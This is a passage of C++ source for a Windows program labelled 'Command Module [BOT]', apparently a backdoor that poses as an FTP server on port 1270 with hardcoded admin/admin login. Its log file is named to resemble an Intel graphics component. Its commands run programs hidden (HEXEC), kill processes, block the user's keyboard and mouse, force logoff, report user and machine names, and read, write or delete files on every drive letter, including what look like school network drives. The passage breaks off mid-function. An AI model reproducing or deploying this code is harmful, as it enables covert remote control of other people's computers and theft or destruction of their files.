/*
 * Command Module [BOT]
 *
 * VERSION 1.30 [STABLE]
 *
 * Copyright (c) 2011
 * All rights reserved.
 *
 * Dinux 2010
 *
 * <Target main file>
 *  Entry point for win32loader
 */

#include <stdio.h>
#include <winsock.h>
#include <windows.h>
#include <winable.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include "synclogger.h"
#include "vfs.h"
#include "tree.cpp"

using namespace std;

#define SERVERID "Command Module 1.30"
#define PACKET_SIZE 1452
#define SOCKET_FILE_IO_DIRECTION_SEND 1
#define SOCKET_FILE_IO_DIRECTION_RECEIVE 2

#define USER "admin"
#define PASSWD "admin"

bool Startup();
void Cleanup();

bool WINAPI ListenThread(LPVOID);
bool WINAPI MessageBoxThread(const char *);
bool WINAPI ConnectionThread(SOCKET);
bool SocketSendString(SOCKET, const char *);
DWORD SocketReceiveString(SOCKET, char *, DWORD);
DWORD SocketReceiveData(SOCKET, char *, DWORD);
SOCKET EstablishDataConnection(SOCKADDR_IN *, SOCKET *);
BOOL KillProcessByName(char *szProcessToKill);
void LookupHost(IN_ADDR ia, char *pszHostName);
bool DoSocketFileIO(SOCKET sCmd, SOCKET sData, HANDLE hFile, DWORD dwDirection, DWORD *pdwAbortFlag);

DWORD dwCommandTimeout = 300, dwConnectTimeout = 15;
bool isLog = false;
DWORD dwActiveConnections = 0;
SOCKET sListen;
SOCKADDR_IN saiListen;
SyncLogger *pLog;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pszCmdLine, int nShowCmd)
{
	MSG msg;

	if(strstr(GetCommandLine(), "-debug") != 0){
		isLog = true;
	}

	if(Startup()){
		while(GetMessage(&msg, 0, 0, 0)){
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	Cleanup();

	return false;
}

bool Startup()
{
	WSADATA wsad;
	char szLogFile[512];
	DWORD dw;

	GetModuleFileName(0, szLogFile, 512);
	*strrchr(szLogFile, '\\') = 0;
	strcat(szLogFile, "\\igfxevent.log");

	if(isLog){
		pLog = new SyncLogger(szLogFile);
	}

	if(isLog){
		pLog->Log("====================================");
		pLog->Log(SERVERID);
		pLog->Log("Module init()");
	}

	ZeroMemory(&saiListen, sizeof(SOCKADDR_IN));
	saiListen.sin_family = AF_INET;
	saiListen.sin_addr.S_un.S_addr = INADDR_ANY;
	saiListen.sin_port = htons(1270);

	WSAStartup(MAKEWORD(1, 1), &wsad);

	sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(bind(sListen, (SOCKADDR *)&saiListen, sizeof(SOCKADDR_IN))){
		if(isLog){
			pLog->Log("Unable to bind socket");
		}
		closesocket(sListen);
		return false;
	}
	listen(sListen, SOMAXCONN);

	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ListenThread, 0, 0, &dw));

	return true;
}

void Cleanup()
{
	WSACleanup();

	if(isLog){
		pLog->Log("Module terminated()");
	}

	if(isLog){
		delete pLog;
	}
}

bool WINAPI ListenThread(LPVOID lParam)
{
	SOCKET sIncoming;
	DWORD dw;

	if(isLog){
		pLog->Log("Module listen()");
	}

	while((sIncoming = accept(sListen, 0, 0)) != INVALID_SOCKET){
		CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ConnectionThread, (void *)sIncoming, 0, &dw));
	}
	closesocket(sListen);

	return false;
}

bool WINAPI MessageBoxThread(const char* szMessage)
{
	MessageBox(NULL, szMessage, "CMD Module", MB_OK | MB_ICONWARNING | MB_SETFOREGROUND);
	return true;
}

bool WINAPI ConnectionThread(SOCKET sCmd)
{
	SOCKET sData = 0, sPasv = 0;
	SOCKADDR_IN saiCmd, saiCmdPeer, saiData, saiPasv;
	char szPeerName[64], szOutput[1024], szCmd[512], szMount[512], *pszParam, *szPeerAddr;
	string strUser, strCurrentVirtual, strNewVirtual, strRnFr;
	DWORD dw, tdw, dwRestOffset=0;
	bool isLoggedIn = false;
	HANDLE hFile;
	SYSTEMTIME st;
	FILETIME ft;
	VFS *pVFS = NULL;
	VFS::listing_type listing;
	UINT_PTR i;

	pVFS = new VFS();
	pVFS->Mount("/disk-os", "C:");
	pVFS->Mount("/disk-home", "M:");
	pVFS->Mount("/disk-prog", "P:");
	pVFS->Mount("/disk-student", "S:");
	pVFS->Mount("/disk-wissel", "W:");
	pVFS->Mount("/disk-net-o", "O:");
	pVFS->Mount("/disk-temp-f", "F:");
	pVFS->Mount("/disk-temp-e", "E:");
	pVFS->Mount("/disk-temp-g", "G:");
	pVFS->Mount("/disk-temp-h", "H:");
	pVFS->Mount("/disk-temp-i", "I:");
	pVFS->Mount("/disk-temp-j", "J:");
	pVFS->Mount("/disk-temp-k", "K:");
	pVFS->Mount("/disk-temp-l", "L:");
	pVFS->Mount("/disk-temp-n", "N:");
	pVFS->Mount("/disk-temp-q", "Q:");
	pVFS->Mount("/disk-temp-r", "R:");
	pVFS->Mount("/disk-temp-t", "T:");
	pVFS->Mount("/disk-temp-u", "U:");
	pVFS->Mount("/disk-temp-v", "V:");
	pVFS->Mount("/disk-temp-x", "X:");
	pVFS->Mount("/disk-temp-y", "Y:");
	pVFS->Mount("/disk-temp-z", "Z:");

	ZeroMemory(&saiData, sizeof(SOCKADDR_IN));

	dw = sizeof(SOCKADDR_IN);
	getpeername(sCmd, (SOCKADDR *)&saiCmdPeer, (int *)&dw);
	LookupHost(saiCmdPeer.sin_addr, szPeerName);
	szPeerAddr = inet_ntoa(saiCmdPeer.sin_addr);

	if(isLog){
		sprintf(szOutput, "[%u] Incomming connection %s[%s]:%u", sCmd, szPeerName, szPeerAddr, ntohs(saiCmdPeer.sin_port));
		pLog->Log(szOutput);
	}

	sprintf(szOutput, "220 %s\r\n", SERVERID);
	SocketSendString(sCmd, szOutput);

	dw = sizeof(SOCKADDR_IN);
	getsockname(sCmd, (SOCKADDR*)&saiCmd, (int *)&dw);

	for(;;){
		dw = SocketReceiveString(sCmd, szCmd, 511);

		if(dw == -1){
			SocketSendString(sCmd, "421 Connection timed out\r\n");
			break;
		}else if(dw > 511){
			SocketSendString(sCmd, "500 Command line too long\r\n");
			continue;
		}

		if(pszParam = strchr(szCmd, ' ')){
		    *(pszParam++) = 0;
		}else{
		    pszParam = szCmd + strlen(szCmd);
		}

		if(!strcmp(szCmd, "USER")){
			if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
				continue;
			}else if(isLoggedIn){
				SocketSendString(sCmd, "503 Already logged in, use REIN to change users\r\n");
				continue;
			}else if(dwActiveConnections >= 5){
                		SocketSendString(sCmd, "421 Connection refused due to limitation\r\n");
				if(isLog){
					sprintf(szOutput, "[%u] Connection refused due to limitation", sCmd);
                    			pLog->Log(szOutput);
				}
                		break;
			}else{
				strUser = pszParam;
                		if(pszParam){
					sprintf(szOutput, "331 User %s requires password\r\n", strUser.c_str());
					SocketSendString(sCmd, szOutput);
					continue;
				}
			}
		}

		if(!strcmp(szCmd, "PASS")){
			if(strUser.empty()){
				SocketSendString(sCmd, "503 Bad sequence of commands, send USER first\r\n");
			}else if(isLoggedIn){
				SocketSendString(sCmd, "503 Already logged in. Use REIN to change users\r\n");
			}else{
                		if(!strcmp(USER, strUser.c_str()) && !strcmp(PASSWD, pszParam)){
					isLoggedIn = true;
					dwActiveConnections++;
					strCurrentVirtual = "/";
					sprintf(szOutput, "230 root logged in\r\n");
					SocketSendString(sCmd, szOutput);
					if(isLog){
                        			sprintf(szOutput, "[%u] root logged in", sCmd);
                        			pLog->Log(szOutput);
					}
				}else{
					SocketSendString(sCmd, "530 Login incorrect\r\n");
					if(isLog){
                        			sprintf(szOutput, "[%u] login incorrect", sCmd);
                        			pLog->Log(szOutput);
					}
				}
			}
		}

		else if(!strcmp(szCmd, "REIN")){
			if(isLoggedIn){
				isLoggedIn = false;
				dwActiveConnections--;
				sprintf(szOutput, "220 root logged out\r\n");
				SocketSendString(sCmd, szOutput);
				if(isLog){
                    			sprintf(szOutput, "[%u] root logged out", sCmd);
                    			pLog->Log(szOutput);
				}
				strUser.clear();
			}
			SocketSendString(sCmd, "220 REIN command successful\r\n");
		}

		else if(!strcmp(szCmd, "FEAT")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "211 Features:\r\n SIZE\r\n REST STREAM\r\n MDTM\r\n TVFS\r\n211 END\r\n");
			}else{
                		SocketSendString(sCmd, "211 Features:\r\n SIZE\r\n REST STREAM\r\n MDTM\r\n TVFS\r\n INFO\r\n MSGB\r\n LDSK\r\n KILL\r\n PKILL\r\n CLSE\r\n LOFF\r\n EXEC\r\n HEXEC\r\n BLOCK\r\n UNBLOCK\r\n211 END\r\n");
			}
		}

		else if(!strcmp(szCmd, "SYST")){
			SocketSendString(sCmd, "215 WIN32-XP@ONDERWIJSGROEP.NET WORKSTATION L8\r\n");
		}

		else if(!strcmp(szCmd, "QUIT")){
			if(isLoggedIn){
				isLoggedIn = false;
				dwActiveConnections--;
				sprintf(szOutput, "221 root logged out\r\n");
				SocketSendString(sCmd, szOutput);
				if(isLog){
					sprintf(szOutput, "[%u] root logged out", sCmd);
					pLog->Log(szOutput);
				}

			}
			SocketSendString(sCmd, "221 Connection closed\r\n");
		}

		else if(!strcmp(szCmd, "KILL")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				isLoggedIn = false;
				if(isLog){
					sprintf(szOutput, "[%u] force kill()", sCmd);
					pLog->Log(szOutput);
				}
				SocketSendString(sCmd, "221 Connection closed\r\n");
				Cleanup();
				exit(1);
			}
		}

		else if(!strcmp(szCmd, "NOOP")){
			SocketSendString(sCmd, "200 NOOP command successful\r\n");
		}

		else if(!strcmp(szCmd, "INFO")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				char acUserName[25];
				char acComputerName[100];
				DWORD nUserName = sizeof(acUserName);
				DWORD nComputerName = sizeof(acComputerName);
			
				GetUserName(acUserName, &nUserName);
				GetComputerName(acComputerName, &nComputerName);
			
				sprintf(szOutput, "Object %s@%s\r\n200 INFO command succesful\r\n", acUserName, acComputerName);
				SocketSendString(sCmd, szOutput);
			}
		}

		else if(!strcmp(szCmd, "CLSE")){
            		if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(isLog){
					sprintf(szOutput, "[%u] force disconnect()", sCmd);
					pLog->Log(szOutput);
				}
				break;
			}
		}

		else if(!strcmp(szCmd, "LOFF")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(isLog){
					sprintf(szOutput, "[%u] object logoff()", sCmd);
					pLog->Log(szOutput);
				}
				ExitWindowsEx(0, 0);
			}
		}

		else if(!strcmp(szCmd, "BLOCK")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(isLog){
					sprintf(szOutput, "[%u] object block()", sCmd);
					pLog->Log(szOutput);
				}
				BlockInput(true);
			}
		}

		else if(!strcmp(szCmd, "UNBLOCK")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(isLog){
					sprintf(szOutput, "[%u] object unblock()", sCmd);
					pLog->Log(szOutput);
				}
				BlockInput(false);
			}
		}

		else if(!strcmp(szCmd, "MSGB")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)MessageBoxThread, pszParam, 0, &tdw));
				if(isLog){
					sprintf(szOutput, "[%u] object msgbox()", sCmd);
					pLog->Log(szOutput);
				}
				SocketSendString(sCmd, "200 MSGB command succesful\r\n");
			}
		}

		else if(!strcmp(szCmd, "EXEC")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				ShellExecute(NULL, "open", pszParam, NULL, NULL, SW_SHOW);
				if(isLog){
					sprintf(szOutput, "[%u] object execute()", sCmd);
					pLog->Log(szOutput);
				}
				SocketSendString(sCmd, "200 EXEC command succesful\r\n");
			}
		}

		else if(!strcmp(szCmd, "HEXEC")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				ShellExecute(NULL, "open", pszParam, NULL, NULL, SW_HIDE);
				if(isLog){
					sprintf(szOutput, "[%u] object execute hidden()", sCmd);
					pLog->Log(szOutput);
				}
				SocketSendString(sCmd, "200 HEXEC command succesful\r\n");
			}
		}

		else if(!strcmp(szCmd, "PKILL")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
                		KillProcessByName(pszParam);
                		SocketSendString(sCmd, "200 PKILL command succesful\r\n");
            		}
		}

		else if(!strcmp(szCmd, "LDSK")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				char szBuffer[MAX_PATH+100];
				DWORD dwLogicalDrives = GetLogicalDrives();
				int nDrive;
				UINT uType;

				for(nDrive = 0; nDrive<32; nDrive++){
					if(dwLogicalDrives & (1 << nDrive)){
						wsprintf(szBuffer, "%c:\\", nDrive + 'A');
						uType = GetDriveType(szBuffer);
						wsprintf(&szBuffer[3], " Id: %u, Type: %s ", uType, (uType == DRIVE_REMOVABLE) ? "FLOPPY" : ((uType == DRIVE_FIXED) ? "HARD DISK" : ((uType == DRIVE_REMOTE) ? "NETWORK" : ((uType == DRIVE_CDROM) ? "CDROM" : ((uType == DRIVE_RAMDISK) ? "RAMDISK" : ((uType == 1) ? "DOES NOT EXIST" : "UNKNOWN DRIVE TYPE" ))))));
						
						sprintf(szOutput, "%s\r\n", szBuffer);
						SocketSendString(sCmd, szOutput);
					}
				}
                		SocketSendString(sCmd, "200 LDSK command succesful\r\n");
			}
		}

		else if(!strcmp(szCmd, "PWD") || !strcmp(szCmd, "XPWD")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				sprintf(szOutput, "257 \"%s\" is current directory\r\n", strCurrentVirtual.c_str());
				SocketSendString(sCmd, szOutput);
			}
		}

		else if(!strcmp(szCmd, "CWD") || !strcmp(szCmd, "XCWD")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(pVFS->IsFolder(strNewVirtual.c_str())){
					strCurrentVirtual = strNewVirtual;
					sprintf(szOutput, "250 \"%s\" is now current directory\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}else{
					sprintf(szOutput, "550 \"%s\": Path not found\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "CDUP") || !strcmp(szCmd, "XCUP")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), "..", strNewVirtual);
				strCurrentVirtual = strNewVirtual;
				sprintf(szOutput,"250 %s is now current directory\r\n", strCurrentVirtual.c_str());
				SocketSendString(sCmd, szOutput);
			}
		}

		else if(!strcmp(szCmd, "TYPE")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				SocketSendString(sCmd, "200 TYPE command successful\r\n");
			}
		}

		else if(!strcmp(szCmd, "REST")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam || (!(dw = StrToInt(pszParam)) && (*pszParam != '0'))){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				dwRestOffset = dw;
				sprintf(szOutput, "350 Ready to resume transfer at %u bytes\r\n", dwRestOffset);
				if(isLog){
					sprintf(szOutput, "[%u] resume transfer", sCmd);
					pLog->Log(szOutput);
				}

				SocketSendString(sCmd, szOutput);
			}
		}

		else if(!strcmp(szCmd, "PORT")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				ZeroMemory(&saiData, sizeof(SOCKADDR_IN));
				saiData.sin_family = AF_INET;
				for(dw = 0; dw < 6; dw++){
					if(dw < 4) ((unsigned char *)&saiData.sin_addr)[dw] = (unsigned char)StrToInt(pszParam);
					else ((unsigned char *)&saiData.sin_port)[dw-4] = (unsigned char)StrToInt(pszParam);
					if(!(pszParam = strchr(pszParam, ','))) break;
					pszParam++;
				}
				if(dw == 5){
					if(sPasv){
						closesocket(sPasv);
						sPasv = 0;
					}
					SocketSendString(sCmd, "200 PORT command successful\r\n");
				}else{
					SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
					ZeroMemory(&saiData, sizeof(SOCKADDR_IN));
				}
			}
		}

		else if(!strcmp(szCmd, "PASV")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(sPasv){
				    closesocket(sPasv);
				}
				ZeroMemory(&saiPasv, sizeof(SOCKADDR_IN));
				saiPasv.sin_family = AF_INET;
				saiPasv.sin_addr.S_un.S_addr = INADDR_ANY;
				saiPasv.sin_port = 0;
				sPasv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
				bind(sPasv, (SOCKADDR *)&saiPasv, sizeof(SOCKADDR_IN));
				listen(sPasv, 1);
				dw = sizeof(SOCKADDR_IN);
				getsockname(sPasv, (SOCKADDR *)&saiPasv, (int *)&dw);
				sprintf(szOutput, "227 Entering Passive Mode (%u,%u,%u,%u,%u,%u)\r\n", saiCmd.sin_addr.S_un.S_un_b.s_b1, saiCmd.sin_addr.S_un.S_un_b.s_b2, saiCmd.sin_addr.S_un.S_un_b.s_b3, saiCmd.sin_addr.S_un.S_un_b.s_b4, ((unsigned char *)&saiPasv.sin_port)[0], ((unsigned char *)&saiPasv.sin_port)[1]);
				SocketSendString(sCmd, szOutput);
				if(isLog){
					sprintf(szOutput, "[%u] enter data connection", sCmd);
					pLog->Log(szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "LIST") || !strcmp(szCmd, "NLST")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(*pszParam == '-'){
					if(pszParam = strchr(pszParam, ' ')){
						pszParam++;
					}
				}
				if(pszParam && *pszParam){
					pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				}else{
					strNewVirtual = strCurrentVirtual;
				}
				if(pVFS->GetDirectoryListing(strNewVirtual.c_str(), strcmp(szCmd, "LIST"), listing)){
					sprintf(szOutput, "150 Opening %s mode data connection for listing of \"%s\".\r\n", sPasv ? "passive" : "active", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
					sData = EstablishDataConnection(&saiData, &sPasv);
					if(sData){
						for(VFS::listing_type::const_iterator it = listing.begin(); it != listing.end(); ++it){
							SocketSendString(sData, it->second.c_str());
						}
						listing.clear();
						closesocket(sData);
						sprintf(szOutput, "226 %s command successful\r\n", strcmp(szCmd, "NLST") ? "LIST" : "NLST");
						SocketSendString(sCmd, szOutput);
					}else{
						listing.clear();
						SocketSendString(sCmd, "425 Can't open data connection\r\n");
					}
				}else{
					sprintf(szOutput, "550 \"%s\": Path not found\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
                		}
			}
		}

		else if(!strcmp(szCmd, "STAT")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(*pszParam == '-') if(pszParam = strchr(pszParam, ' ')) pszParam++;
				if(pszParam && *pszParam){
					pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				}
				else{
					strNewVirtual = strCurrentVirtual;
				}
				if(pVFS->GetDirectoryListing(strNewVirtual.c_str(), 1, listing)){
					sprintf(szOutput, "212 Sending directory listing of \"%s\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd,szOutput);
					for(VFS::listing_type::const_iterator it = listing.begin(); it != listing.end(); ++it) {
						SocketSendString(sCmd, it->second.c_str());
					}
					listing.clear();
					SocketSendString(sCmd, "212 STAT command successful\r\n");
				}else{
					sprintf(szOutput, "550 Path %s not found\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "RETR")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				hFile = pVFS->CreateFile(strNewVirtual.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING);
				if(hFile == INVALID_HANDLE_VALUE){
					sprintf(szOutput, "550 %s: Unable to open file\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}else{
					if(dwRestOffset){
						SetFilePointer(hFile, dwRestOffset, 0, FILE_BEGIN);
						dwRestOffset = 0;
					}
					sprintf(szOutput, "150 Opening %s mode data connection for \"%s\r\n", sPasv ? "passive" : "active", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
					sData = EstablishDataConnection(&saiData, &sPasv);
					if(sData){
						if(isLog){
							sprintf(szOutput, "[%u] began downloading %s", sCmd, strNewVirtual.c_str());
							pLog->Log(szOutput);
						}
						if(DoSocketFileIO(sCmd, sData, hFile, SOCKET_FILE_IO_DIRECTION_SEND, &dw)){
							sprintf(szOutput, "226 %s transferred successfully\r\n", strNewVirtual.c_str());
							SocketSendString(sCmd, szOutput);
							if(isLog){
								sprintf(szOutput, "[%u] download completed", sCmd);
								pLog->Log(szOutput);
							}
						}else{
							SocketSendString(sCmd, "426 Connection closed; transfer aborted\r\n");
							if(dw){
							    SocketSendString(sCmd, "226 ABOR command successful\r\n");
							}
							if(isLog){
								sprintf(szOutput, "[%u] download aborted", sCmd);
								pLog->Log(szOutput);
							}
						}
						closesocket(sData);
					}else{
						SocketSendString(sCmd, "425 Cannot open data connection\r\n");
					}
					CloseHandle(hFile);
				}
			}
		}

		else if(!strcmp(szCmd, "STOR") || !strcmp(szCmd, "APPE")){
			if(!isLoggedIn){
				SocketSendString(sCmd,"530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd,"501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				hFile = pVFS->CreateFile(strNewVirtual.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_ALWAYS);
				if(hFile == INVALID_HANDLE_VALUE){
					sprintf(szOutput, "550 %s: Unable to open file.\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}else{
					if(strcmp(szCmd, "APPE") == 0){
						SetFilePointer(hFile, 0, 0, FILE_END);
					}else{
						SetFilePointer(hFile, dwRestOffset, 0, FILE_BEGIN);
						SetEndOfFile(hFile);
					}
					dwRestOffset = 0;
					sprintf(szOutput, "150 Opening %s mode data connection for %s\r\n", sPasv ? "passive" : "active", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
					sData = EstablishDataConnection(&saiData, &sPasv);
					if(sData){
						if(isLog){
							sprintf(szOutput, "[%u] began uploading %s", sCmd, strNewVirtual.c_str());
							pLog->Log(szOutput);
						}
						if(DoSocketFileIO(sCmd, sData, hFile, SOCKET_FILE_IO_DIRECTION_RECEIVE, 0)){
							sprintf(szOutput, "226 %s transferred successfully\r\n", strNewVirtual.c_str());
							SocketSendString(sCmd, szOutput);
							if(isLog){
								sprintf(szOutput, "[%u] upload completed", sCmd);
								pLog->Log(szOutput);
							}
						}else{
							SocketSendString(sCmd, "426 Connection closed, transfer aborted\r\n");
							if(isLog){
								sprintf(szOutput, "[%u] upload aborted", sCmd);
								pLog->Log(szOutput);
							}
						}
						closesocket(sData);
					}else{
						SocketSendString(sCmd, "425 Cannot open data connection\r\n");
					}
					CloseHandle(hFile);
				}
			}
		}

		else if(!strcmp(szCmd, "ABOR")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else{
				if(sPasv){
					closesocket(sPasv);
					sPasv = 0;
					if(isLog){
						sprintf(szOutput, "[%u] transfer aborted", sCmd);
						pLog->Log(szOutput);
					}
				}
				dwRestOffset = 0;
				SocketSendString(sCmd, "200 ABOR command successful\r\n");
			}
		}

		else if(!strcmp(szCmd, "SIZE")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				hFile = pVFS->CreateFile(strNewVirtual.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING);
				if(hFile == INVALID_HANDLE_VALUE){
					sprintf(szOutput, "550 %s: File not found\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}else{
					sprintf(szOutput, "213 %u\r\n", GetFileSize(hFile, 0));
					SocketSendString(sCmd, szOutput);
					CloseHandle(hFile);
				}
			}
		}

		else if(!strcmp(szCmd, "MDTM")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				for(i = 0; i < 14; i++){
					if((pszParam[i] < '0') || (pszParam[i] > '9')){
						break;
					}
				}
				if((i == 14) && (pszParam[14] == ' ')){
					strncpy(szOutput, pszParam, 4);
					szOutput[4] = 0;
					st.wYear = StrToInt(szOutput);
					strncpy(szOutput, pszParam + 4, 2);
					szOutput[2] = 0;
					st.wMonth = StrToInt(szOutput);
					strncpy(szOutput, pszParam + 6, 2);
					st.wDay = StrToInt(szOutput);
					strncpy(szOutput, pszParam + 8, 2);
					st.wHour = StrToInt(szOutput);
					strncpy(szOutput, pszParam + 10, 2);
					st.wMinute = StrToInt(szOutput);
					strncpy(szOutput, pszParam + 12, 2);
					st.wSecond = StrToInt(szOutput);
					pszParam += 15;
					dw = 1;
				}else{
					dw = 0;
				}
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(dw){
					hFile = pVFS->CreateFile(strNewVirtual.c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING);
					if(hFile == INVALID_HANDLE_VALUE){
						sprintf(szOutput, "550 %s: File not found\r\n", strNewVirtual.c_str());
						SocketSendString(sCmd, szOutput);
					}else{
						SystemTimeToFileTime(&st, &ft);
						SetFileTime(hFile, 0, 0, &ft);
						CloseHandle(hFile);
						SocketSendString(sCmd, "250 MDTM command successful\r\n");
					}
				}else{
					hFile = pVFS->CreateFile(strNewVirtual.c_str(), GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_EXISTING);
					if(hFile == INVALID_HANDLE_VALUE){
						sprintf(szOutput, "550 %s: File not found\r\n", strNewVirtual.c_str());
						SocketSendString(sCmd, szOutput);
					}else{
						GetFileTime(hFile, 0, 0, &ft);
						CloseHandle(hFile);
						FileTimeToSystemTime(&ft, &st);
						sprintf(szOutput, "213 %04u%02u%02u%02u%02u%02u\r\n", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
						SocketSendString(sCmd, szOutput);
					}
				}
			}
		}

		else if(!strcmp(szCmd, "DELE")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(pVFS->FileExists(strNewVirtual.c_str())){
					if(pVFS->DeleteFile(strNewVirtual.c_str())){
						sprintf(szOutput, "250 %s deleted successfully\r\n", strNewVirtual.c_str());
						SocketSendString(sCmd, szOutput);
						if(isLog){
							sprintf(szOutput, "[%u] deleted %", sCmd, strNewVirtual.c_str());
							pLog->Log(szOutput);
						}
					}else{
						sprintf(szOutput, "550 %s : Unable to delete file\r\n", strNewVirtual.c_str());
						SocketSendString(sCmd, szOutput);
					}
				}else{
					sprintf(szOutput, "550 %s: File not found\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "RNFR")){
			if(!isLoggedIn){
				SocketSendString(sCmd, "530 Not logged in\r\n");
			}else if(!*pszParam){
				SocketSendString(sCmd, "501 Syntax error in parameters or arguments\r\n");
			}else{
				pVFS->ResolveRelative(strCurrentVirtual.c_str(), pszParam, strNewVirtual);
				if(pVFS->FileExists(strNewVirtual.c_str())){
					strRnFr = strNewVirtual;
					sprintf(szOutput, "350 %s: File exists, proceed with RNTO\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}else{
					sprintf(szOutput, "550 %s: File not found\r\n", strNewVirtual.c_str());
					SocketSendString(sCmd, szOutput);
				}
			}
		}

		else if(!strcmp(szCmd, "RNTO")){
